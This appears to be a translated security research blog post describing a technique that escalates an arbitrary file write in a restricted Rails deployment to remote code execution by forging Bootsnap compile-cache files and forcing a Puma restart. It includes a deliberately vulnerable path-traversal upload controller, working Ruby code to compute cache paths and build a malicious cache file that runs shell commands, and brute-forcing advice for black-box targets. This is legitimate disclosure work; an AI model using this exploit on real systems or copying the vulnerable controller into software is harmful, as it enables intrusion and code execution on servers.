#  在受限的 Rails 应用程序中通过任意文件写入实现 RCE   
 Ots安全   2025-01-25 13:25  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
**介绍**  
  
最近，我们遇到了一种情况，需要利用在受限环境中运行的 Rails 应用程序中的任意文件写入漏洞。该应用程序是通过 Dockerfile 部署的，该 Dockerfile 对可以写入的目录施加了限制。  
  
在这篇博文中，我们描述了一种技术，该技术可通过滥用 Bootsnap（Rails 自 5.2 版以来使用的缓存库）的缓存机制，利用任意文件写入漏洞实现远程代码执行 (RCE)。  
  
**漏洞**  
  
该漏洞是标准的任意文件写入，可以通过以下易受攻击的代码证明：  
  
```
class VulnerableController < ApplicationController
  def upload
    uploaded_file = params[:file]
    filename = params[:filename].presence || uploaded_file.original_filename
 
    save_uploaded_file(uploaded_file, filename)
    render json: { status: "File uploaded successfully!", filename: filename }
  rescue => e
    render json: { error: e.message }, status: :unprocessable_entity
  end
 
  private
 
  def save_uploaded_file(uploaded_file, filename)
    upload_path = Rails.root.join("tmp", "uploads")
    FileUtils.mkdir_p(upload_path)
 
    # Save the file to the upload directory
    File.open(File.join(upload_path, filename), 'wb') do |file|
      file.write(uploaded_file.read)
    end
  end
end
```  
  
  
在这个示例代码中，我们可以看到用户可以完全控制系统路径（通过路径遍历）和文件内容，这允许他们在系统的任何位置写入文件。  
  
**限制**  
  
尽管漏洞利用原语相当强大，但攻击并不那么简单，因为该应用程序对我们可以写入的目录有一些限制。这是因为它是使用默认生产 Dockerfile 部署的，该 Dockerfile 现在在rails new使用 Rails 7.1 版创建新应用程序时自动生成。[1]  
  
Dockerfile 的相关部分如下所示：  
  
```
(...)
 
# Make sure RUBY_VERSION matches the Ruby version in .ruby-version
ARG RUBY_VERSION=3.2.2
FROM docker.io/library/ruby:$RUBY_VERSION-slim AS base
 
# Rails app lives here
WORKDIR /rails
 
(...)
 
# Install application gems
COPY Gemfile Gemfile.lock ./
RUN bundle install && \
    rm -rf ~/.bundle/ "${BUNDLE_PATH}"/ruby/*/cache "${BUNDLE_PATH}"/ruby/*/bundler/gems/*/.git && \
    bundle exec bootsnap precompile --gemfile
 
# Copy application code
COPY . .
 
# Precompile bootsnap code for faster boot times
RUN bundle exec bootsnap precompile app/ lib/
 
(...)
 
# Run and own only the runtime files as a non-root user for security
RUN groupadd --system --gid 1000 rails && \
    useradd rails --uid 1000 --gid 1000 --create-home --shell /bin/bash && \
    chown -R rails:rails db log storage tmp
USER 1000:1000
 
# Entrypoint prepares the database.
ENTRYPOINT ["/rails/bin/docker-entrypoint"]
 
# Start the server by default, this can be overwritten at runtime
EXPOSE 3000
CMD ["./bin/rails", "server"]
```  
  
  
在底部我们可以看到它创建了一个非 root 用户来运行应用程序，并且该用户仅是这些目录的所有者：db、log、storage、tmp和/home/rails。简而言之，这限制了我们可以写入的位置，因为其他有趣的文件归 root 用户所有。除了这些目录之外，我们仍然可以写入其他一些位置，例如/tmp  （由 root 拥有但每个人都有写入权限）、/proc/PID/fd/中的某些文件等。  
  
**我们的方法：通过 Bootsnap 进行攻击**  
  
然后，我们使用 Rails 7.2.1.2 复制了应用程序环境，开始尝试利用漏洞。通过查看这些目录中的条目，有一件事引起了我们的注意：bootsnap [2] 在tmp中缓存文件。  
  
在tmp/cache/bootsnap中，我们看到了库用于缓存文件的目录结构。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tac8ZXk0Vcf708TpgyhS2SLk8CoznmC04GUbWa1LNZeDNb2gnXD9JhaufR8JsdCKFg7dYQpEFaeibKQ/640?wx_fmt=webp&from=appmsg "")  
  
我们注意到一个包含 gem 文件路径的load-path-cache文件，后来发现它是 MessagePack 格式。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tac8ZXk0Vcf708TpgyhS2SLkLE5qDQPhgEaE0Pxnv0Qh4bDwEicQtYf3HTMhjR8IT3Sbgb9RRPslnrw/640?wx_fmt=webp&from=appmsg "")  
  
最后， compile-cache-*目录中有大量已编译的 Ruby、JSON 和 YAML 文件，遵循特定的目录结构。一眼望去，编译后的 Ruby 文件就引人注目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tac8ZXk0Vcf708TpgyhS2SLklZ3nUiblTWC9GmN7veXKQ0suWm9aBLSo0efponaibx5VfO4D3HQ29P7g/640?wx_fmt=webp&from=appmsg "")  
  
为了更好地理解这一切，我们查看了 Bootsnap v 1.18.4 [2] 的文档和源代码。当 Rails 应用程序在启动期间调用 bootsnap 时会发生什么情况，可以从以下摘要中看到：  
  
Rails 应用程序启动期间的 Bootsnap 操作（分步说明）  
  
1.初始化  
- Bootsnap 在应用程序启动时加载到config/boot.rb中。  
  
- 它默认使用Rails.root/tmp/cache作为缓存目录。  
  
2. 重写require和load  
- 修补Kernel#require和Kernel#load。  
  
- 优先使用其缓存来解析文件，如果需要则回退到 Ruby 的LOAD_PATH遍历。  
  
3. 加载路径缓存  
- Bootsnap 为LOAD_PATH （load-path-cache文件）中的文件构建或更新解析路径的缓存。  
  
- 缓存存储所需文件名（例如，active_record/railtie）到其绝对路径（例如，/path/to/ your/gems/…/active_record/railtie.rb ）的映射，从而实现更快的查找。  
  
- 每次需要或加载时，Bootsnap 首先检查缓存：  
  
- 缓存命中：立即返回解析的路径。  
  
- 缓存未命中：回退到 Ruby 的默认LOAD_PATH遍历。  
  
4. 编译缓存  
- Bootsnap 缓存已编译的 Ruby 字节码（*.rb）、YAML（*.yml）和 JSON（*.json）文件：  
  
- Ruby 文件：使用RubyVM::InstructionSequence预编译字节码。  
  
- YAML 和 JSON 文件：缓存序列化数据以便更快地重用。  
  
- 缓存文件存储在缓存目录中，由 FNV-1a 64 位哈希键控。例如，/path/to/ your/gems/…/active_record/railtie.rb 的缓存文件将存储在路径类似于tmp/cache/bootsnap/compile-cache-iseq/00/0f2931ea350b70 的文件中（此处的假哈希值仅用于可视化）。  
  
- 当文件更新时自动使缓存条目无效。  
  
**缓存文件格式**  
  
缓存文件由两部分组成，第一部分是标头（struct bs_cache_key）[5]，第二部分是缓存的原始文件的编译内容。  
  
下图显示了缓存文件的十六进制转储输出以及 struct bs_cache_key中的值的映射。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tac8ZXk0Vcf708TpgyhS2SLk661XtyVnPPoPCfHjrFYKoOKr37JOdc3QOfxhnOJP3J5Ls5HEVyBhZA/640?wx_fmt=png&from=appmsg "")  
  
Bootsnap 在缓存验证中使用了大多数这些字段，正如我们在下面的代码中看到的[6]：  
  
文件：ext/bootsnap/bootsnap.c  
  
```
static enum cache_status cache_key_equal_fast_path(struct bs_cache_key *k1,
                                     struct bs_cache_key *k2) {
  if (k1->version == k2->version &&
          k1->ruby_platform == k2->ruby_platform &&
          k1->compile_option == k2->compile_option &&
          k1->ruby_revision == k2->ruby_revision && k1->size == k2->size) {
      if (k1->mtime == k2->mtime) {
        return hit;
      }
      if (revalidation) {
        return stale;
      }
  }
  return miss;
}
```  
  
  
下面的列表描述了相关字段：  
- version：缓存格式版本，确保与 Bootsnap 当前版本兼容。  
  
- ruby_platform：Ruby 运行平台的哈希值（例如，x86_64-linux）。  
  
- compile_option：编译 Ruby 文件时使用的编译选项的 CRC32（例如，优化标志）。  
  
- ruby_revision：Ruby 特定修订版本的哈希值（例如，git 提交哈希）。  
  
- size：原始文件的大小。  
  
- mtime：原始文件的最后修改时间。  
  
考虑到这些信息，我们制定了一个通过覆盖缓存文件来实现 RCE 的计划。  
  
**开发**  
  
我们的计划是挑选一个 Rails 应用可能需要的文件，覆盖其缓存版本并触发应用重启。原因是当应用在启动过程中需要目标文件时，它将加载我们的恶意缓存，从而使我们能够实现 RCE。  
  
**覆盖缓存文件**  
  
我们选择覆盖Ruby 标准库中的set.rb缓存文件。它也可以是其他文件，但最好是 Rails 本身、应用程序或其中一个库可能执行的文件。  
  
我们获取了在 docker 容器内部填充缓存键的信息。从 Dockerfile 中看到，Ruby 版本是 3.2.2，所以set.rb文件的位置是/usr/local/lib/ruby/3.2.0/set.rb。通过在 docker 容器中执行以下 Ruby 代码，我们很容易就得到了我们所需的信息：  
  
```
require 'json'
 
def get_info(pattern)
  path = Dir.glob(pattern).first
  json = {
    version: RUBY_VERSION,
    require_target: path,
    revision: RUBY_REVISION,
    size: File.size(path),
    mtime: File.mtime(path).to_i,
    compile_option: RubyVM::InstructionSequence.compile_option.inspect
  }
  JSON.dump(json)
end
puts get_info("/usr/local/lib/ruby/*/set.rb")
```  
  
  
  
```
{
  "version": "3.2.2",
  "require_target": "/usr/local/lib/ruby/3.2.0/set.rb",
  "revision": "e51014f9c05aa65cbf203442d37fef7c12390015",
  "size": 25920,
  "mtime": 1680174389,
  "compile_option": "{:inline_const_cache=>true, :peephole_optimization=>true, :tailcall_optimization=>false, :specialized_instruction=>true, :operands_unification=>true, :instructions_unification=>false, :stack_caching=>false, :frozen_string_literal=>false, :debug_frozen_string_literal=>false, :coverage_enabled=>true, :debug_level=>0}"
}
```  
  
  
考虑一下这是我们从现在开始使用的ruby_info变量的值。  
  
这样，我们就可以准备恶意缓存文件了。首先，我们需要通过复制 Bootsnap 的哈希机制来计算缓存文件的正确位置 [3]。  
  
```
def fnv1a_64(data)
  # FNV-1a 64-bit hash function for a given string
  h = 0xcbf29ce484222325
  data.each_byte do |byte|
    h ^= byte
    h = (h * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF  # Keep it within 64 bits
  end
  h
end
 
def bs_cache_path(cachedir, path)
  # Generate cache path based on FNV-1a hash
  hash_value = fnv1a_64(path)
  first_byte = (hash_value >> (64 - 8)) & 0xFF
  remainder = hash_value & 0x00FFFFFFFFFFFFFF
  File.join(cachedir, "%02x" % first_byte, "%014x" % remainder)
end
 
cachedir = "tmp/cache/bootsnap/compile-cache-iseq"
cache_path = bs_cache_path(cachedir, ruby_info[:require_target])
puts "Cache path: #{cache_path}"
```  
  
  
```
```  
  
之后，我们通过将缓存键与要执行的 Ruby 代码的编译版本连接起来来准备缓存文件的内容：  
  
```
def generate_evil_cache(cache_path, ruby_info)
  require_target = ruby_info[:require_target]
  payload = <<~PAYLOAD
    `id > >&2`
    `rm -f #{cache_path}`
    load("#{require_target}")
  PAYLOAD
 
  compiled_binary = RubyVM::InstructionSequence.compile(payload).to_binary
 
  cache_key = generate_cache_key(ruby_info, compiled_binary.size)
 
  malicious_path = '/tmp/output_file.bin'
  write_binary_file(malicious_path, cache_key, compiled_binary)
 
  puts "File written to #{malicious_path}"
  malicious_path
end
 
def hash_32(data)
  fnv1a_64(data) >> 32
end
 
def generate_cache_key(ruby_info, data_size)
  {
    version:         6, # for v1.18.4. Depends on bootsnap version
    ruby_platform:   hash_32("x86_64-linux"),
    compile_option:  Zlib.crc32(ruby_info[:compile_option]),
    ruby_revision:   hash_32(ruby_info[:revision]),
    size:            ruby_info[:size],
    mtime:           ruby_info[:mtime],
    data_size:       data_size,
    digest:          31337,
    digest_set:      1,
    pad:             "\0" * 15
  }
end
 
def write_binary_file(path, cache_key, binary_data)
  File.open(path, 'wb') do |file|
    file.write(pack_cache_key(cache_key))
    file.write(binary_data)
  end
end
 
def pack_cache_key(cache_key)
  [
    cache_key[:version],
    cache_key[:ruby_platform],
    cache_key[:compile_option],
    cache_key[:ruby_revision],
    cache_key[:size],
    cache_key[:mtime],
    cache_key[:data_size],
    cache_key[:digest],
    cache_key[:digest_set],
    *cache_key[:pad]
  ].pack('L4Q4C1a15')
end
 
evil_cache = generate_evil_cache(cache_path, ruby_info)
```  
  
  
在代码中，你可以看到文件的前 64 个字节由缓存键组成，里面填充了我们之前得到的信息，后面是编译后的恶意 Ruby 代码。请注意，我们使用的版本值为 6，因为这是 Bootsnap v1.18.4 [7] 的正确值。  
  
有效载荷首先执行命令id并将其输出重定向到stderr。此重定向只是为了在 Puma 服务器日志中显示命令的输出以供可视化。然后，为了避免无限递归，我们删除恶意缓存并加载原始set.rb文件，因此 Set 库将成功加载，从而防止应用程序崩溃。  
  
有了路径和内容，我们就利用漏洞来写入缓存文件。  
  
**重启应用程序**  
  
为了重启服务器，我们利用该漏洞在tmp/restart.txt中写入任何内容。这是 Puma 服务器 [4] 的一个功能，会导致重启。  
  
**远程代码执行**  
  
在服务器重启期间，当require 'set'运行语句时，我们的缓存文件就会被执行。  
  
**运行漏洞利用程序**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tac8ZXk0Vcf708TpgyhS2SLkh3o36jLTZqHKoENK0icwzBJhYsbGmnyZRoicpSbf8Q8LB407ibibzTax7A/640?wx_fmt=webp&from=appmsg "")  
  
**检查 Rails 应用程序的日志**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tac8ZXk0Vcf708TpgyhS2SLkI32xNtILiaVyW9eVhqvjHvOL90mLSJGCdPSIlfkVxAMiad39ZKic7XvwQ/640?wx_fmt=webp&from=appmsg "")  
  
在图片中我们可以看到两个文件上传，然后重新启动，然后执行命令的输出id。  
  
存在漏洞的应用程序示例以及随附的漏洞利用代码可在以下位置找到：https://github.com/convisolabs/rails_arb_file_write_bootsnap  
  
**漏洞利用可能性**  
  
使用此技术的白盒攻击很容易，因为我们可以访问所有必要的信息。从某种程度上讲，黑盒攻击也很简单，因为许多字段的值可能性有限，可以使用暴力方法进行测试。  
  
缓存密钥格式和验证在 Bootsnap 的先前版本中似乎一致。但是，请记住，如果目标使用的是更旧的版本，则可能会有所不同。  
  
让我们讨论一下缓存键中的相关字段：  
- version：这取决于 Bootsnap 版本，但 3 到 6 之间的值应该涵盖最新版本（最新版本是 v1.18.4 [7]）。  
  
- ruby_platform：大多数情况下这可能是x86_64-linux 。  
  
- compile_option：这个似乎没有太大变化。  
  
- ruby_revision：这会随着 Ruby 版本而变化，但您可以为想要尝试的每个 Ruby 版本生成一个包含值的数据库。  
  
- size/mtime：这些取决于所选的目标文件，但您也可以为每个 Ruby 版本生成一个数据库。  
  
此外，原始文件的路径（例如/usr/local/lib/ruby/3.2.0/set.rb）会随着 Ruby 版本的变化而变化，可以从数据库中提取。  
  
有关如何生成数据库的示例，请参阅存储库中的脚本：  
  
https://github.com/conisolabs/rails_arb_file_write_bootsnap。  
  
**结论**  
  
在这篇文章中，我们介绍了一种利用 Rails 应用程序中任意文件写入漏洞的技术，其中攻击者可以写入的目录受到一些限制。该技术滥用 Bootsnap 库，该库在最近的 Rails 应用程序中默认使用。通过使用恶意内容覆盖其缓存文件，可以实现任意代码执行。  
  
未来可能进行的工作包括更好的优化，以消除任何重启的需要，或减少在黑盒场景中利用时的暴力破解。此外，人们可以探索其他文件来覆盖，或尝试一种仅通过/proc/PID/fd文件进行利用的方法，如 Stefan Schiller 的这篇精彩文章 [8] 中所示。  
  
**参考**  
  
https://rubyonrails.org/2023/10/5/Rails-7-1-0-has-been-released  
  
https://github.com/Shopify/bootsnap/tree/v1.18.4  
  
https://github.com/Shopify/bootsnap/blob/v1.18.4/ext/bootsnap/bootsnap.c#L297  
  
https://github.com/puma/puma/blob/v6.4.3/lib/puma/plugin/tmp_restart.rb  
  
https://github.com/Shopify/bootsnap/blob/v1.18.4/ext/bootsnap/bootsnap.c#L61  
  
https://github.com/Shopify/bootsnap/blob/v1.18.4/ext/bootsnap/bootsnap.c#L315  
  
https://github.com/Shopify/bootsnap/blob/v1.18.4/ext/bootsnap/bootsnap.c#L85  
  
https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
